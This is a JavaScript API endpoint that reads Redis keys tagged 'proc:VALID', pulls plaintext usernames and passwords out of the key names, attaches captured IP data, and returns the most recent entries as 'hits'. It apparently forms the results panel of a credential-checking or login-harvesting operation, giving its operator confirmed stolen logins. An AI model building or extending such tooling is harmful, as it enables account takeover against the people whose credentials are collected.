import { enforceIpAllowlist } from './_lib/ipAllowlist.js';
import { getRedis } from './_lib/redis.js';

const SCAN_COUNT = 500;

function parseCredFromKey(key) {
  const parts = key.split(':');
  const username = parts[2] || '';
  const password = parts.slice(3).join(':') || '';
  return { username, password };
}

function parseCapture(raw) {
  if (!raw) return null;
  try {
    return JSON.parse(raw);
  } catch (_) {
    return null;
  }
}

async function fetchRecentValids(redis, limit) {
  let cursor = '0';
  const rows = [];

  do {
    const [next, keys] = await redis.scan(cursor, 'MATCH', 'proc:VALID:*', 'COUNT', SCAN_COUNT);
    cursor = next;

    if (keys.length) {
      const tsValues = await redis.mget(keys);
      keys.forEach((key, idx) => {
        const ts = Number(tsValues[idx]) || null;
        const { username, password } = parseCredFromKey(key);
        rows.push({ key, username, password, ts });
      });
    }
  } while (cursor !== '0');

  rows.sort((a, b) => (b.ts || 0) - (a.ts || 0));
  return rows.slice(0, limit);
}

export default async function handler(req, res) {
  if (req.method !== 'GET') {
    res.setHeader('Allow', 'GET');
    res.status(405).json({ error: 'method_not_allowed' });
    return;
  }

  if (!enforceIpAllowlist(req, res)) return;

  const limit = Math.min(Math.max(parseInt(req.query?.limit || '50', 10) || 50, 1), 200);

  try {
    const redis = await getRedis();
    const rows = await fetchRecentValids(redis, limit);

    const captureKeys = rows.map((row) => `cap:VALID:${row.username}:${row.password}`);
    const captureValues = captureKeys.length ? await redis.mget(captureKeys) : [];

    const hits = rows.map((row, idx) => {
      const capture = parseCapture(captureValues[idx]);
      return {
        username: row.username,
        password: row.password,
        ts: row.ts,
        ipAddress: capture?.ipAddress || null,
        capture,
      };
    });

    res.status(200).json({
      timestamp: Date.now(),
      returned: hits.length,
      hits,
    });
  } catch (error) {
    res.status(500).json({ error: 'server_error', message: error.message });
  }
}
